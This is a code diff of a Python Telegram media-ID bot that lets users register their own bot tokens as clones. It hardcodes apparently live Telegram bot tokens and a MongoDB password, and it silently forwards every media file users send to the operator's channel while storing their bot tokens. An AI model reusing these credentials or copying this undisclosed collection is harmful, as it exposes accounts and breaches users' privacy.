@@ -21,46 +21,38 @@ from telegram.ext import (
     CallbackQueryHandler,
     ConversationHandler,
 )
-# Import Motor async MongoDB driver
 from motor.motor_asyncio import AsyncIOMotorClient
 
 # Allow nested event loops (useful in some environments)
 nest_asyncio.apply()
 
 # --- CONFIGURATION ---
-MAIN_BOT_TOKEN = "7793725251:AAEuCnbRw93DxsQnkdX3NgIJkJ1hJNnphZ4"
+MAIN_BOT_TOKEN = "7660007316:AAHnmA8mN8R5_GWEVxUtD-FG1cd5QViVHmw"
 ADMIN_USER_ID = 6773787379
-MEDIA_CHANNEL_ID = -1002444008797  # Channel to forward all media
+MEDIA_CHANNEL_ID = -1002611812353  # Channel to forward all media
 MONGO_URL = "mongodb+srv://kunalrepowalaclone1:RMZDIN4lBnjAz3cZ@cluster0.96iuq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
 DB_NAME = "Cluster0"
-
 WAITING_FOR_BOT_TOKEN = 1
 
-# --- MONGO SETUP ---
+# --- GLOBAL STORAGE (Persistent and Transient) ---
+# MongoDB Collections:
 mongo_client = AsyncIOMotorClient(MONGO_URL)
 db = mongo_client[DB_NAME]
 clone_bots_collection = db["clone_bots"]   # persistent clone bot data
 media_logs_collection = db["media_logs"]     # persistent media logs
 
-# --- TRANSIENT STORAGE (in-memory) ---
-# For clone polling tasks: token -> asyncio.Task
-clone_tasks = {}
-# For clone last activity: token -> timestamp
-clone_last_active = {}
-# For mapping clone token to owner: token -> owner user id
-clone_owners = {}
+# Transient storage:
+download_mode = {}  # This dict is used to track download mode per chat_id
+clone_tasks = {}    # token -> asyncio.Task (polling task)
+clone_last_active = {}  # token -> timestamp
+clone_owners = {}       # token -> owner user id
+clone_info = {}         # token -> bot username
 
 # --- HELPER FUNCTIONS ---
 async def insert_media_log(log: dict):
     await media_logs_collection.insert_one(log)
 
-async def get_all_clone_data():
-    # Returns a list of documents (as dicts)
-    cursor = clone_bots_collection.find({})
-    return await cursor.to_list(length=None)
-
 async def insert_clone_data(user_id: int, token: str, name: str):
-    # Insert a clone bot document if it doesn't already exist.
     document = {
         "user_id": user_id,
         "token": token,
@@ -68,14 +60,12 @@ async def insert_clone_data(user_id: int, token: str, name: str):
         "active": True,
         "added_at": time.time()
     }
-    # Upsert based on token.
     await clone_bots_collection.update_one({"token": token}, {"$set": document}, upsert=True)
 
 async def mark_clone_inactive(token: str):
     await clone_bots_collection.update_one({"token": token}, {"$set": {"active": False}})
 
 # --- COMMON HANDLERS (for Main and Clone Bots) ---
-
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     start_text = (
         "👋 Hi!\n\n"
@@ -89,9 +79,10 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     help_text = (
         "📚 *Help Menu*\n\n"
         "• /help - Show this help message\n"
-        "• /download - Enable download mode (admin only on this bot).\n"
+        "• /download - Enable download mode (admin only on main bot).\n"
         "   For non-admin users, clone your own bot to generate download links.\n"
         "• /clone - Manage your cloned bots (add new bot tokens or mark one inactive).\n"
+        "• /data - (Admin only) Show all clone bot data.\n\n"
         "Usage:\n"
         "1️⃣ Send any media (photo, video, GIF, sticker, voice note, etc.) to get its media ID.\n"
         "2️⃣ If download mode is enabled, the next media message will yield a download link.\n\n"
@@ -100,13 +91,11 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     await update.message.reply_text(help_text, parse_mode=constants.ParseMode.MARKDOWN)
 
 async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    # Only admin may use /download on the main bot.
     if context.bot.token == MAIN_BOT_TOKEN and update.effective_user.id != ADMIN_USER_ID:
         await update.message.reply_text(
             "❌ You are not admin. Clone your own bot and generate download links using it."
         )
         return
-    # Enable download mode
     download_mode[update.effective_chat.id] = True
     await update.message.reply_text(
         "✅ Download mode enabled. Please send a media file to get its download link.",
@@ -164,11 +153,9 @@ async def media_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         parse_mode=constants.ParseMode.HTML,
         reply_to_message_id=update.message.message_id,
     )
-    # Log media in persistent storage
     if context.bot.token == MAIN_BOT_TOKEN:
         bot_username = "MainBot"
     else:
-        # For clone bots, look up the stored username from DB (we use clone_info cache)
         bot_username = clone_info.get(context.bot.token, "UnknownClone")
     log = {
         "bot_username": bot_username,
@@ -177,7 +164,6 @@ async def media_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         "file_id": file_id,
     }
     await insert_media_log(log)
-    # Automatically forward media to the designated channel
     caption = f"Bot: @{bot_username}\nDate: {datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d %H:%M:%S')}"
     try:
         if media_type == "photo":
@@ -200,7 +186,6 @@ async def media_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
             await context.bot.send_message(chat_id=MEDIA_CHANNEL_ID, text=f"Unsupported media type: {media_type}")
     except Exception as e:
         print(f"Error forwarding media to channel: {e}")
-    # For clone bots, update last active time (transient)
     if context.bot.token != MAIN_BOT_TOKEN:
         clone_last_active[context.bot.token] = time.time()
 
@@ -222,7 +207,6 @@ def split_message(text: str, max_length: int = 4000):
 async def admin_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if update.effective_user.id != ADMIN_USER_ID:
         return
-    # Query all clone bot documents from MongoDB.
     cursor = clone_bots_collection.find({})
     clone_list = await cursor.to_list(length=None)
     data_lines = []
@@ -235,21 +219,8 @@ async def admin_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text(chunk)
 
 # --- CLONE MANAGEMENT (Main Bot Only) ---
-def build_clone_keyboard(user_id: int):
-    # Query clone bots for this user from MongoDB (using in-memory cache not used here).
-    # For simplicity, we load from our persistent collection.
-    # In a production system you might cache this.
-    # Here, we assume clone_bots_collection documents for the user.
-    # For our inline keyboard, we load from our in-memory variable "clone_bots_cache"
-    # For this example, we maintain a transient copy per user in memory.
-    # We will query the DB in our clone_command handler.
-    # (This function is used only to build the button layout.)
-    # For simplicity, we assume clone data is already loaded.
-    return InlineKeyboardMarkup([])
-
 async def clone_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
-    # Query clone bots for this user.
     cursor = clone_bots_collection.find({"user_id": user_id})
     user_bots = await cursor.to_list(length=None)
     text_lines = ["📋 Your added clone bots:"]
@@ -260,8 +231,6 @@ async def clone_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
             status = "Active" if bot.get("active", False) else "Inactive"
             text_lines.append(f"{idx+1}. @{bot.get('name', 'Unknown')} - {status}")
     reply_text = "\n".join(text_lines)
-    # For this example, we rebuild the keyboard from our transient in-memory clone data.
-    # (In a production system, you might query and build buttons.)
     keyboard = []
     for idx, bot in enumerate(user_bots):
         status_icon = "✅" if bot.get("active", False) else "❌"
@@ -300,14 +269,11 @@ async def receive_bot_token(update: Update, context: ContextTypes.DEFAULT_TYPE) 
             parse_mode=constants.ParseMode.HTML,
         )
         return WAITING_FOR_BOT_TOKEN
-    # Save clone data persistently.
     await insert_clone_data(user_id, token, me.username)
-    # Also update our in-memory transient info.
     clone_info[token] = me.username
     clone_owners[token] = user_id
     clone_last_active[token] = time.time()
     await update.message.reply_text(f"✅ Bot @{me.username} added successfully!")
-    # Start polling for the new clone bot.
     task = asyncio.create_task(run_clone_bot(token))
     clone_tasks[token] = task
     await clone_command(update, context)
@@ -325,14 +291,12 @@ async def delete_bot_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     if not m:
         return
     idx = int(m.group(1))
-    # Query user's clone bots.
     cursor = clone_bots_collection.find({"user_id": user_id})
     user_bots = await cursor.to_list(length=None)
     if 0 <= idx < len(user_bots):
         removed = user_bots[idx]
         token = removed.get("token")
         bot_name = removed.get("name", "Unknown")
-        # Mark as inactive in the database.
         await mark_clone_inactive(token)
         if token in clone_tasks:
             clone_tasks[token].cancel()
@@ -348,7 +312,6 @@ async def ignore_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 # --- CLONE BOT POLLING (Each clone bot runs its own polling) ---
 def build_clone_app(token: str) -> Application:
     app = ApplicationBuilder().token(token).concurrent_updates(True).build()
-    # In a clone bot, we add a /clone command to show its own help.
     async def clone_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         text = (
             "🤖 *Your Clone Bot Commands*\n\n"
@@ -369,7 +332,7 @@ async def run_clone_bot(token: str) -> None:
 
 # --- CLONE INACTIVITY MONITOR ---
 async def monitor_clone_inactivity(main_app: Application) -> None:
-    INACTIVITY_THRESHOLD = 3600  # 30 seconds
+    INACTIVITY_THRESHOLD = 30  # seconds
     while True:
         now = time.time()
         tokens_to_mark = []
@@ -379,18 +342,16 @@ async def monitor_clone_inactivity(main_app: Application) -> None:
         for token in tokens_to_mark:
             owner_id = clone_owners.get(token)
             bot_name = clone_info.get(token, "Unknown")
-            # Mark as inactive in DB.
             await mark_clone_inactive(token)
             if token in clone_tasks:
                 clone_tasks[token].cancel()
                 del clone_tasks[token]
-            # Remove token from transient last_active so we don't send repeated messages.
             clone_last_active.pop(token, None)
             try:
                 await main_app.bot.send_message(
                     chat_id=owner_id,
                     text=(
-                        f"⚠️ Your Bot Removed (@{bot_name}) for inactivity for 1 Hours.\n"
+                        f"⚠️ Your Bot Removed (@{bot_name}) for inactivity for 30 Seconds.\n"
                         "💾 Again Clone Using /clone"
                     ),
                 )
@@ -407,8 +368,6 @@ async def main() -> None:
     main_app.add_handler(CommandHandler("download", download_command))
     main_app.add_handler(CommandHandler("clone", clone_command))
     main_app.add_handler(CommandHandler("data", admin_data_command))
-    # /media command is removed since media is forwarded automatically.
-
     conv_handler = ConversationHandler(
         entry_points=[CallbackQueryHandler(add_bot_callback, pattern="^add_bot$")],
         states={
